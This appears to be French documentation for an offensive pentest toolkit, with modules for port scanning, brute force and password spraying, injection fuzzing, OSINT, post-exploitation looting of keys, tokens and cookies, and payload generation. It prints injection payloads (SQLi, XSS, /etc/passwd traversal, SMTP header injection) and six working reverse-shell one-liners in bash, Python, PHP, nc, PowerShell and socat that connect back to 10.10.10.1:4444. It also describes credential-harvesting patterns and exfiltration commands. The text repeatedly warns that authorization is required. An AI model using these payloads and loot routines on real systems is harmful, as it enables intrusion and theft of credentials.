1. Scan & Fingerprinting

Objectif : Scanner les ports d'une cible (IP ou domaine) pour identifier les services, bannières, versions, et technologies exposées.

Menu principal :
  • Scan de ports (TCP, 1-1024 par défaut, ou plage personnalisée)
Champs demandés :
  • Cible : IP ou nom de domaine (ex : 192.168.1.10, site.com)
  • Ports : Liste ou plage (ex : 22,80,443 ou 1-1024)
Explications :
  • Le scan détecte les ports ouverts, services, bannières, versions, et technologies (si disponibles).
  • Le scan se fait en multithread pour plus de rapidité.
  • Les résultats sont affichés directement dans le terminal.
Export : Les résultats du scan sont utilisés pour la suite des modules (pas d'export automatique à cette étape, sauf si intégré dans un rapport global).
Conseil : Scanner uniquement des cibles autorisées. Privilégier des plages raisonnables pour éviter d'être détecté ou bloqué.

2. Vulnérabilités & Exploitation

Objectif : Rechercher automatiquement des failles de sécurité (CVE, exploits connus) sur la cible.

Pour qui ? Idéal pour les débutants ou les curieux qui veulent savoir si une machine est vulnérable.

Menus et sous-menus :
  • Scan CVE : Recherche dans une base de données mondiale les failles connues pour chaque service détecté.
  • Exploits : Propose des liens ou des commandes pour tester l’exploitation de ces failles (toujours à but pédagogique).
  • Tests spécifiques : Heartbleed, Shellshock, etc.
Champs demandés :
  • Cible : Adresse IP ou nom de domaine à scanner (ex : 192.168.1.10, example.com)
  • Type de scan : Rapide (services principaux) ou Complet (tous les ports/services)
  • Test spécifique : (optionnel) Choix d’un test ciblé (Heartbleed, Shellshock...)
  • Export : Voulez-vous sauvegarder les résultats ? (Oui/Non)
Explications :
  • Le scan rapide va plus vite mais peut rater des services ou failles secondaires.
  • Le scan complet est plus long mais exhaustif.
  • Chaque vulnérabilité trouvée est expliquée (niveau de risque, comment la corriger, etc.).
Exemple d’utilisation :
  • Saisir 192.168.1.10, choisir scan rapide, consulter les failles détectées.
  • Lancer un test Heartbleed sur un serveur SSL.
Export : exports/<date>/vuln/ (rapports détaillés).

3. Authentification & Bruteforce

Objectif : Tester la robustesse des mots de passe sur des services comme SSH, FTP, HTTP.

Pour qui ? Débutants, administrateurs, pentesters et toute personne souhaitant vérifier la sécurité des accès.

Sous-menus détaillés :
  • 1. Brute-force SSH : Teste toutes les combinaisons user/pass sur un serveur SSH. Gère délais, erreurs, logs détaillés. Supporte userlist et passlist personnalisés.
  • 2. Brute-force FTP : Idem pour le protocole FTP. Prend en compte les erreurs FTP spécifiques et les délais entre tentatives.
  • 3. Brute-force HTTP : Teste des identifiants sur des formulaires web (POST/GET), Basic/Digest Auth, avec détection de succès/échec personnalisable (codes HTTP, chaînes dans la réponse, etc.).
  • 4. Password Spraying : Tente un même mot de passe sur une liste d’utilisateurs pour éviter les lockouts. Multi-protocole (SSH, FTP, HTTP). Gère les délais et la détection de blocage.
  • 5. Détection lockout : Analyse intelligente des résultats pour détecter les blocages de comptes, ralentissements, erreurs spécifiques (codes 429, 403, messages d’alerte, etc.). Génère un rapport d’alerte.
Champs demandés (avec exemples) :
  • Cible : IP ou URL du service à tester (ex : 192.168.1.10, ftp.site.com, http://site.com/login)
  • Userlist : Fichier texte contenant les noms d’utilisateurs à tester (exemple : users.txt avec un utilisateur par ligne)
  • Passlist : Fichier texte contenant les mots de passe à tester (exemple : passwords.txt avec un mot de passe par ligne)
  • Mots-clés succès/échec : Chaînes à rechercher dans la réponse pour déterminer si la connexion a réussi ou échoué (ex : Welcome, Login failed, code HTTP 200/401, etc.)
  • Délais/tentatives : Temps d’attente entre les essais (en secondes), nombre max de tentatives avant pause (ex : 0.5s, 5 tentatives)
  • Protocole : (pour le password spraying) : ssh, ftp, http
  • Champs formulaire HTTP : (pour brute-force HTTP) : user_field, pass_field, method (POST/GET), extra_data (pour champs additionnels)
Explications pédagogiques et conseils :
  • Le brute-force classique essaie chaque combinaison user/pass sur la cible (attention au risque de lockout sur certains services).
  • Le password spraying limite ce risque en testant un mot de passe courant sur toute la liste d’utilisateurs avant de changer de mot de passe.
  • La détection lockout analyse les réponses pour repérer les blocages, ralentissements, ou messages suspects et vous alerte automatiquement.
  • Les logs détaillent chaque tentative, succès, échec, erreur rencontrée, et sont exportables en JSON, Markdown, HTML.
  • Pour les formulaires HTTP, adaptez les champs user_field et pass_field selon le nom réel dans le code source du formulaire.
  • Respectez toujours la légalité et obtenez une autorisation avant de tester un service qui ne vous appartient pas.
Exemples d’utilisation :
  • Lancer un brute-force SSH sur 192.168.1.10 avec users.txt et passwords.txt, délai de 1s entre tentatives.
  • Faire un password spraying HTTP sur http://site.com/login avec le mot de passe Welcome2024! sur tous les utilisateurs de users.txt.
  • Détecter un lockout après 5 échecs consécutifs sur un serveur FTP.
Exemple de userlist :
admin
root
jdoe
jsmith
Exemple de passlist :
password
123456
Welcome2024!
Export : Les résultats sont enregistrés dans exports/<date>/bruteforce_ssh/, bruteforce_ftp/, bruteforce_http/, ou password_spraying/ selon le module (formats .json/.md/.html avec logs détaillés).
Conseil sécurité : Utilisez un délai (>0.5s) pour éviter les blocages, surveillez les alertes lockout, et ne testez jamais sans autorisation.

4. Fuzzing & Tests d'injection

Objectif : Détecter des vulnérabilités d’injection (XSS, LFI, SQLi, etc.) sur des services web, FTP, SMTP.

Pour qui ? Pentesters, développeurs, administrateurs, débutants curieux de la sécurité applicative.

Sous-menus détaillés :
  • 1. Fuzzing HTTP : Injection automatique de payloads sur des formulaires, URLs, headers, paramètres GET/POST, cookies. Détection de XSS, LFI, RCE, etc.
  • 2. Fuzzing FTP : Teste les commandes FTP avec des payloads pour détecter des failles (buffer overflow, traversal, etc.).
  • 3. Fuzzing SMTP : Injection de payloads dans les champs d’un serveur mail (ex : From, Subject, Body) pour détecter des failles de spoofing, injection, etc.
Champs demandés (avec exemples) :
  • Cible : URL, IP ou serveur à tester (ex : http://site.com/page, ftp.site.com, mail.site.com)
  • Payloads : Liste ou fichier de chaînes d’injection à tester (ex : payloads.txt, ou liste intégrée de XSS, LFI, SQLi, etc.)
  • Paramètres à fuzz : Nom(s) des champs/paramètres à injecter (ex : search, id, username, cookie)
  • Mots-clés succès/échec : Chaînes à rechercher dans la réponse pour repérer une injection réussie (ex : <script>, root:x:, SQL syntax, etc.)
  • Délais/tentatives : Temps d’attente entre chaque essai, nombre max de tentatives (ex : 0.2s, 100 payloads max)
Explications pédagogiques et conseils :
  • Le fuzzing consiste à injecter des valeurs inattendues dans les champs d’entrée pour repérer des comportements anormaux ou des failles.
  • Les payloads intégrés couvrent XSS, LFI, RCE, SQLi, path traversal, etc. Vous pouvez aussi fournir vos propres payloads.
  • Pour chaque injection, le toolkit analyse la réponse pour détecter des indices de vulnérabilité (ex : exécution de code, affichage inattendu, erreurs SQL, etc.).
  • Les logs détaillent chaque tentative, succès, échec, et sont exportables en JSON, Markdown, HTML.
  • Pour les tests sur FTP/SMTP, ciblez des serveurs de test ou obtenez une autorisation explicite.
Exemples d’utilisation :
  • Fuzzer le champ search d’un site avec une liste de payloads XSS pour détecter des injections de script.
  • Tester un champ id avec des payloads LFI pour voir si des fichiers sensibles sont accessibles.
  • Injecter des commandes dans un serveur FTP pour repérer des failles de buffer overflow.
Exemple de payloads.txt :
' OR '1'='1
<script>alert(1)</script>
../../../../etc/passwd
%0aMAIL FROM: attacker@example.com
Export : Les résultats sont enregistrés dans exports/<date>/fuzzing/ (formats .json/.md/.html avec logs détaillés).
Conseil sécurité : Ne jamais fuzzer sans autorisation, privilégiez toujours des environnements de test, et analysez les logs pour détecter les injections réussies.

5. Reconnaissance & OSINT

Objectif : Collecter un maximum d’informations publiques sur une cible (IP, domaine, email, user, etc.) pour préparer les phases d’attaque ou d’audit.

Pour qui ? Pentesters, blue team, journalistes, particuliers souhaitant vérifier leur propre exposition sur Internet.

Sous-menus détaillés :
  • 1. Recherche Shodan : Interroge l’API Shodan pour obtenir les services exposés, bannières, ports ouverts, vulnérabilités connues, géolocalisation, etc.
  • 2. Google Dorks : Génère et teste des requêtes avancées Google pour trouver des fichiers sensibles, backups, pages d’admin, fuites d’email, etc. Familles de dorks : fichiers, index, login, leaks, backups, vulnérabilités, etc.
  • 3. Sherlock : Recherche la présence d’un pseudo sur des centaines de sites sociaux et plateformes publiques.
  • 4. Pastebin Leaks : Recherche de fuites de données sur Pastebin (emails, credentials, tokens, etc.).
  • 5. DNS Recon : Bruteforce de sous-domaines, récupération de records DNS publics (A, MX, TXT, SPF, etc.).
  • 6. Transparency Report : Vérifie la réputation/phishing/malware d’un domaine via Google Transparency Report.
Champs demandés (avec exemples) :
  • Cible : IP, domaine, email, pseudo, etc. (ex : site.com, john.doe@gmail.com, jdoe, 8.8.8.8)
  • Type de cible : domain, email, user, ip
  • API Keys : (optionnel) pour les services nécessitant une clé (Shodan, etc.)
  • Batch targets : Liste de cibles à traiter en mode batch (ex : targets.txt)
  • Proxies : (optionnel) pour anonymiser les requêtes (ex : socks5://127.0.0.1:9050)
Explications pédagogiques et conseils :
  • L’OSINT (Open Source Intelligence) consiste à collecter des infos accessibles publiquement pour dresser un profil de la cible.
  • Les Google Dorks permettent de trouver des ressources cachées ou sensibles grâce à des requêtes avancées (ex : site:site.com ext:sql).
  • Shodan permet de découvrir les services exposés d’une IP ou d’un domaine et d’identifier rapidement des failles connues.
  • Sherlock automatise la recherche de comptes sur des centaines de sites à partir d’un pseudo.
  • Le DNS bruteforce permet de découvrir des sous-domaines cachés ou oubliés.
  • Les résultats sont exportés et structurés par cible, avec logs détaillés.
Exemples d’utilisation :
  • Scanner site.com avec Shodan pour voir les ports ouverts et services exposés.
  • Lancer une recherche Google Dorks pour trouver des fichiers .sql ou .bak exposés sur un domaine.
  • Vérifier la présence d’un pseudo sur les réseaux sociaux avec Sherlock.
  • Faire un batch OSINT sur une liste d’emails pour détecter des fuites sur Pastebin.
Exemple de familles de dorks générés :
files
index
login
leaks
backups
vuln
Export : Les résultats sont enregistrés dans exports/<date>/osint/ (formats .json/.md/.html avec logs détaillés par cible).
Conseil sécurité : L’OSINT ne nécessite pas d’autorisation mais il faut respecter la vie privée et la législation sur les données personnelles.

6. Post-exploitation & Loot

Objectif : Automatiser la récupération de fichiers sensibles, tokens, credentials et artefacts post-exploitation sur une machine compromise.

Pour qui ? Pentesters, red team, administrateurs, toute personne souhaitant valider l’impact d’une compromission.

Sous-menus détaillés :
  • 1. Loot automatique : Recherche et exfiltration de fichiers sensibles (config, .ssh, .git, .env, tokens, cookies, clés API, credentials, etc.).
  • 2. Extraction de tokens : Recherche et extraction de tokens d’authentification (JWT, OAuth, API keys) dans fichiers, variables d’environnement, historiques.
  • 3. Dump de cookies : Extraction des cookies de navigateurs ou d’applications web pour réutilisation ou analyse.
  • 4. Dump de profils : Récupération de profils utilisateurs, historiques de commandes, fichiers d’historique (bash, zsh, powershell, etc.).
  • 5. Extraction de mots de passe : Recherche de mots de passe en clair dans fichiers, scripts, dumps mémoire, etc.
Champs demandés (avec exemples) :
  • Répertoire cible : Dossier à analyser (ex : /home/user/, C:\Users\bob\)
  • Types de loot : config, ssh, git, env, token, cookie, history, profile, etc.
  • Extensions ciblées : .env, .json, .db, .bak, .log, etc.
  • Filtres personnalisés : (optionnel) mots-clés à rechercher dans les fichiers (ex : password=, api_key, token)
Explications pédagogiques et conseils :
  • Le loot automatique scanne les dossiers à la recherche de fichiers ou de patterns typiques de secrets et credentials.
  • Les tokens et cookies extraits peuvent permettre de rebondir ou d’accéder à d’autres services.
  • Les exports sont structurés par type de loot et par cible pour faciliter l’analyse.
  • Veillez à ne pas extraire/diffuser de données sensibles sans autorisation.
  • Les logs détaillent chaque fichier trouvé, chaque secret extrait, et sont exportables en JSON, Markdown, HTML.
Exemples d’utilisation :
  • Looter tous les fichiers .env et .json dans /var/www/ pour extraire des clés API ou secrets.
  • Extraire tous les tokens et cookies d’un profil utilisateur Windows.
  • Rechercher les mots de passe en clair dans les historiques bash et powershell.
Exemple de patterns de loot :
password=
api_key
secret
jwt
cookie
Export : Les résultats sont enregistrés dans exports/<date>/loot/ (formats .json/.md/.html avec logs détaillés par type et par cible).
Conseil sécurité : Ne jamais extraire ni conserver de secrets sans autorisation, et toujours chiffrer les exports sensibles.

7. Rapports & Export

Objectif : Générer, organiser et exporter des rapports détaillés pour chaque module du toolkit, facilitant l’analyse, la restitution et la traçabilité des actions.

Pour qui ? Pentesters, RSSI, auditeurs, étudiants, toute personne souhaitant documenter un test ou une analyse.

Sous-menus détaillés :
  • 1. Export automatique : Chaque module exporte automatiquement ses résultats dans un dossier exports/<date>/<module>/ (formats .json, .md, .html).
  • 2. Rapports détaillés : Génération de rapports synthétiques ou complets, avec logs, statistiques, détails techniques, conseils de remédiation.
  • 3. Organisation par module : Les exports sont structurés par date, par type de test, et par cible pour faciliter la navigation.
  • 4. Export personnalisés : Possibilité de filtrer, d’anonymiser ou de formater les exports selon les besoins (ex : rapport client, rapport technique, logs bruts).
Champs et options (avec exemples) :
  • Format : json, md, html (ex : rapport_vuln.json, loot.md)
  • Module concerné : bruteforce, fuzzing, osint, loot, escalade, offensif, etc.
  • Options avancées : Anonymisation, filtrage, tri, export par lot.
Explications pédagogiques et conseils :
  • Tous les résultats sont exportés automatiquement à chaque étape, pour garantir la traçabilité et faciliter la rédaction de rapports finaux.
  • Les formats json et md sont adaptés à l’automatisation et à la génération de rapports personnalisés.
  • Les rapports html sont lisibles dans un navigateur et peuvent être partagés facilement.
  • Les exports sont datés et structurés pour permettre un suivi chronologique et par cible.
  • Des conseils de remédiation ou des liens vers les CVE/exploits sont inclus dans les rapports vulnérabilités.
Exemples d’utilisation :
  • Générer un rapport complet de brute-force SSH en bruteforce_ssh_20250415.html.
  • Exporter tous les résultats OSINT d’un batch d’emails en osint_20250415.json.
  • Filtrer les logs de loot pour ne garder que les extractions de tokens.
Exemple d’arborescence d’exports :
exports/
  20250415/
    bruteforce_ssh/
      bruteforce_ssh_20250415.html
    osint/
      osint_20250415.json
    loot/
      loot_20250415.md
    escalade/
      escalade_20250415.html
    offensif/
      reverse_shells_20250415.md
Conseil : Sauvegardez régulièrement les exports, anonymisez les rapports avant diffusion externe, et conservez les logs bruts pour audit.

8. Outils offensifs & Exploitation

Objectif : Générer et utiliser des payloads d’exploitation (reverse shells, stagers, exploits publics) pour tester la compromission d’une cible.

Pour qui ? Pentesters, red team, formateurs en sécurité, étudiants.

Sous-menus détaillés :
  • 1. Génération de reverse shells : Création automatique de commandes/payloads pour obtenir un shell distant sur la cible (bash, python, php, nc, powershell, socat, etc.).
  • 2. Génération de stagers : Création de scripts d’initialisation pour charger des payloads plus complexes (multi-stage).
  • 3. Téléchargement/Upload de fichiers : Génération de commandes pour exfiltrer ou injecter des fichiers sur la cible (wget, curl, certutil, bitsadmin, etc.).
  • 4. Utilisation d’exploits publics : Intégration de PoC/exploits connus (CVE, ExploitDB, Metasploit) pour tester des vulnérabilités spécifiques.
Champs demandés (avec exemples) :
  • Langage/Protocole : bash, python, php, nc, powershell, socat, etc.
  • LHOST/LPORT : Adresse IP et port d’écoute pour le reverse shell (ex : 10.10.10.1, 4444)
  • Exploit cible : CVE, nom de vulnérabilité ou chemin vers un PoC (ex : CVE-2021-44228, exploit.py)
Explications pédagogiques et conseils :
  • Le reverse shell permet de prendre le contrôle d’une machine distante en faisant sortir la connexion de la cible vers l’attaquant.
  • Les stagers sont utiles pour contourner les restrictions de taille ou de détection (multi-stage, obfuscation, etc.).
  • Les payloads générés sont adaptés au contexte (OS, droits, restrictions réseau).
  • La base d’exploits publics permet de tester rapidement des failles connues (avec liens vers ExploitDB, Metasploit, etc.).
  • Les logs détaillent chaque commande générée, chaque tentative d’exploitation, et sont exportables en JSON, Markdown, HTML.
Exemples d’utilisation :
  • Générer un reverse shell bash pour 10.10.10.1:4444 et l’injecter via une faille RCE.
  • Créer un stager PowerShell pour charger un payload Meterpreter.
  • Tester un exploit public CVE-2021-44228 sur une cible vulnérable.
Exemple de reverse shells générés :
bash -i >& /dev/tcp/10.10.10.1/4444 0>&1
python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
php -r '$sock=fsockopen("10.10.10.1",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
nc -e /bin/bash 10.10.10.1 4444
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
socat TCP:10.10.10.1:4444 EXEC:/bin/bash
Export : Les résultats sont enregistrés dans exports/<date>/offensif/ (formats .json/.md/.html avec logs détaillés par type et par cible).
Conseil sécurité : N’utilisez jamais ces outils sans autorisation explicite, et vérifiez la légalité des exploits publics utilisés.
